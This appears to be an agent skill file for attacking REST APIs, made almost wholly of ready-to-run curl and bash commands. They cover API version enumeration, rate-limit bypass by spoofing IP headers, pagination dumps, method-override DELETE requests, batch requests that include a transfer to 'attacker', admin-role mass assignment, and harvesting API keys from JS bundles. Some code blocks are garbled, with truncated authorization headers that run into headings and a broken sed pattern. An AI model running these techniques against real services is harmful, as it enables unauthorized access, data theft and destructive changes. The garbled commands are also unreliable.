---
name: rest_api_security
description: REST API security testing including versioning abuse, rate limit bypass, pagination manipulation, and endpoint enumeration
---

# REST API Security

REST APIs expose attack surfaces beyond traditional web apps: versioning inconsistencies, missing rate limits, pagination abuse, content negotiation quirks, and batch operations. Focus on finding hidden endpoints, bypassing protections, and exploiting API-specific logic flaws.

## Attack Surface

**Common Patterns:** Versioned (`/api/v1/`), nested resources, CRUD operations, batch/bulk, search/filter
**Documentation Sources:** `/swagger.json`, `/openapi.json`, `/api-docs`, `/graphql` (introspection), JS bundles, `.well-known/openid-configuration`

## API Versioning Abuse

### Version Enumeration

```bash
# Path-based versions
for v in v0 v1 v2 v3 internal beta alpha staging dev test qa pre; do
  code=$(curl -so /dev/null -w "%{http_code}" "https://api.target.com/$v/users")
  [ "$code" != "404" ] && echo "[+] /$v/users → $code"
done

# Header-based versions
curl -H "Accept: application/vnd.target.v2+json" https://api.target.com/users
curl -H "X-API-Version: 2" https://api.target.com/users
curl -H "Api-Version: 2024-01-01" https://api.target.com/users

# Query param versions
curl "https://api.target.com/users?version=2"
```

### Version-Specific Vulnerabilities

```bash
# Older versions may return more fields, lack rate limiting, have weaker auth
diff <(curl -s https://api.target.com/v1/users/1) \
     <(curl -s https://api.target.com/v2/users/1)

# Auth bypass per version
curl https://api.target.com/v1/admin/users -H "Authorization: Bearer *** https://api.target.com/internal/admin/users -H "Authorization: Bearer *** Rate Limit Bypass

### Header Manipulation

```bash
# Server may trust these for "real" IP
for header in "X-Forwarded-For" "X-Real-IP" "X-Originating-IP" "X-Client-IP" \
  "X-Remote-IP" "X-Remote-Addr" "CF-Connecting-IP" "True-Client-IP" "Forwarded"; do
  curl -s -H "$header: 10.$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))" \
    https://api.target.com/login -d "user=admin&pass=test"
done

# Multiple headers (some servers pick first, some pick last)
curl -H "X-Forwarded-For: 1.1.1.1, 2.2.2.2, 3.3.3.3" https://api.target.com/login
```

### Endpoint Variation

```bash
# Rate limit may be per-endpoint
curl https://api.target.com/v1/login
curl https://api.target.com/v1/login/
curl https://api.target.com/v1/Login
curl https://api.target.com/v1/login?_=1
```

### Token Bucket Analysis

```python
import requests, time

def probe_limit(url, headers=None):
    for i in range(200):
        r = requests.get(url, headers=headers)
        if r.status_code == 429:
            print(f"Rate limited at request {i+1}")
            print(f"  Retry-After: {r.headers.get('Retry-After', '?')}s")
            print(f"  X-RateLimit-Limit: {r.headers.get('X-RateLimit-Limit', '?')}")
            return i
    print("No rate limit detected in 200 requests")
```

## Pagination Abuse

```bash
# Large page size — may return all data
curl "https://api.target.com/v1/users?page_size=10000"
curl "https://api.target.com/v1/users?page_size=-1"     # negative (may return all)
curl "https://api.target.com/v1/users?page_size=0"      # zero (may disable pagination)
curl "https://api.target.com/v1/users?limit=999999"

# Offset manipulation
curl "https://api.target.com/v1/users?offset=-1&limit=10"    # negative offset
curl "https://api.target.com/v1/users?offset=999999&limit=10" # large offset
curl "https://api.target.com/v1/users?page=-1"                # negative page

# Cursor-based: decode base64 cursor, understand format, manipulate

# Pagination metadata leaks
curl "https://api.target.com/v1/users?page=1" | jq '.total_count, .next_page_url'
```

## Content Negotiation Attacks

```bash
# Different representations may expose different data
# CSV/Excel exports may include fields hidden in JSON; HTML may show debug info
curl -H "Accept: application/json" https://api.target.com/users/1
curl -H "Accept: application/xml" https://api.target.com/users/1
curl -H "Accept: text/csv" https://api.target.com/users/1
curl -H "Accept: text/html" https://api.target.com/users/1

# Content-Type confusion (XXE potential)
curl -X POST https://api.target.com/v1/users \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><user><role>admin</role></user>'

# Charset-based bypass
curl -X POST https://api.target.com/v1/users \
  -H "Content-Type: application/json; charset=utf-16" \
  -d '{"role":"admin"}'
```

## HTTP Method Override

```bash
# If GET allowed but POST blocked, try override headers
curl -X GET https://api.target.com/v1/users/1 -H "X-HTTP-Method-Override: DELETE"
curl -X GET https://api.target.com/v1/users/1 -H "X-Method-Override: DELETE"
curl -X GET https://api.target.com/v1/users/1 -H "X-HTTP-Method: DELETE"
curl -X POST https://api.target.com/v1/users/1 -H "X-HTTP-Method-Override: DELETE"

# Query parameter override
curl -X GET "https://api.target.com/v1/users/1?_method=DELETE"
curl -X POST "https://api.target.com/v1/users/1" -d "_method=DELETE"

# Method enumeration
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  code=$(curl -so /dev/null -w "%{http_code}" -X $method https://api.target.com/v1/users)
  echo "$method → $code"
done
```

## Batch Endpoint Abuse

```bash
# Authorization bypass — check if batch enforces per-sub-request auth
curl -X POST https://api.target.com/v1/batch \
  -H "Authorization: Bearer *** \
  -H "Content-Type: application/json" \
  -d '{
    "requests": [
      {"method": "GET", "path": "/v1/admin/users"},
      {"method": "DELETE", "path": "/v1/users/123"},
      {"method": "POST", "path": "/v1/transfer", "body": {"to":"attacker","amount":10000}}
    ]
  }'

# Rate limit bypass — batch processes 1000 requests in single call
curl -X POST https://api.target.com/v1/batch \
  -H "Content-Type: application/json" \
  -d '{"requests": ['$(printf '{"method":"GET","path":"/v1/users/%d"},' {1..1000})']}'
```

## API Key Leakage

```bash
# JS bundle analysis
curl -s https://app.com/ | grep -oE 'src="[^"]*\.js[^"]*"' | while read src; do
  url=$(echo "$src" | sed 's/src="//;s/"//')
  [[ "$url" != http* ]] && url="https://app.com$url"
  curl -s "$url" | grep -oiE '(api[_-]?key|secret|token)[=:]["'"'"'][^"'"'"']+'
done

# Common patterns in JS
curl -s https://app.com/app.js | grep -oE 'sk-[a-zA-Z0-9]{20,}'   # OpenAI
curl -s https://app.com/app.js | grep -oE 'AIza[a-zA-Z0-9_-]{35}'  # Google
curl -s https://app.com/app.js | grep -oE 'ghp_[a-zA-Z0-9]{36}'    # GitHub

# Error message leakage
curl "https://api.target.com/v1/users?fields=*,internal_api_key"
curl "https://api.target.com/v1/users?debug=true"

# Source map exposure (may contain hardcoded secrets)
curl -s https://app.com/app.js | grep -oE '//# sourceMappingURL=[^ ]+' | while read map; do
  url=$(echo "$map" | sed 's/.*mappingSourceURL=//')
  [[ "$url" != http* ]] && url="https://app.com/$url"
  curl -s "$url" | grep -oiE '(api[_-]?key|secret|token)[=:]["'"'"'][^"'"'"']+'
done
```

## Advanced Techniques

```bash
# GraphQL introspection
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name type{name}}}}}"}'

# Mass assignment: inject extra fields
curl -X PATCH https://api.target.com/v1/users/me -d '{"name":"John","role":"admin","is_admin":true}'

# Server-side parameter pollution
curl "https://api.target.com/v1/users?id=1&id=2"
```

## Tools

| Tool | Purpose |
|------|---------|
| ffuf | Endpoint and parameter fuzzing |
| arjun | Hidden parameter discovery |
| katana | Crawling JS bundles for endpoints and secrets |
| Burp Suite | Request interception, Intruder for fuzzing |
| Kiterunner | API endpoint wordlist-based scanning |
| jwt_tool | JWT manipulation and cracking |
| graphql-cop | GraphQL security scanner |

## Verification Checklist

1. [ ] Enumerate all API versions (v1, v2, internal, beta)
2. [ ] Compare authorization and response fields across versions
3. [ ] Test rate limits with header rotation and endpoint variation
4. [ ] Test pagination for data leakage and large page sizes
5. [ ] Test HTTP method override (X-HTTP-Method-Override, _method)
6. [ ] Check batch endpoints for auth bypass and rate limit bypass
7. [ ] Search JS bundles for hardcoded API keys and secrets
8. [ ] Test content negotiation for different response formats
9. [ ] Map hidden endpoints from source maps, Swagger, and error messages
10. [ ] Verify per-endpoint authorization (not just per-route)
